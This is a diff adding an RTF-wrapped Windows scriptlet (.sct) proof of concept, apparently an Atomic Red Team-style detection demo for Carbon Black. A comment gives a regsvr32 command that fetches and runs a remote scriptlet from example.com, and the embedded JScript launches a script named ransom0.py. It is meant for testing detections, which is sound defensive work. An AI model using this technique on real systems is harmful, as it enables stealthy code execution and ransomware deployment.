@@ -1,0 +1,32 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2639
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww31580\viewh11560\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf0 \expnd0\expndtw0\kerning0
+<?XML version="1.0"?>\
+<scriptlet>\
+<registration \
+    progid="PoC"\
+    classid="\{F0001111-0000-0000-0000-0000FEEDACDC\}" >\
+	<!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->\
+\
+	<!-- .sct files when downloaded, are executed from a path like this -->\
+	<!-- Please Note, file extension does not matter -->\
+	<!-- Though, the name and extension are arbitary.. -->\
+	<!-- c:\\users\\USER\\appdata\\local\\microsoft\\windows\\temporary internet files\\content.ie5\\2vcqsj3k\\file[2].sct -->\
+	<!-- Based on current research, no registry keys are written, since call "uninstall" -->\
+  	<!-- You can either execute locally, or from a url -->\
+	<script language="JScript">\
+		<![CDATA[\
+	    			// Carbon black demo running ransom0.py. Credit to Atomic Red Team / HugoLB0\
+      	   		// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation\
+			var r = new ActiveXObject("WScript.Shell").Run(\'93py ransom0.py\'94);	\
+	\
+		]]>\
+</script>\
+</registration>\
+</scriptlet>}
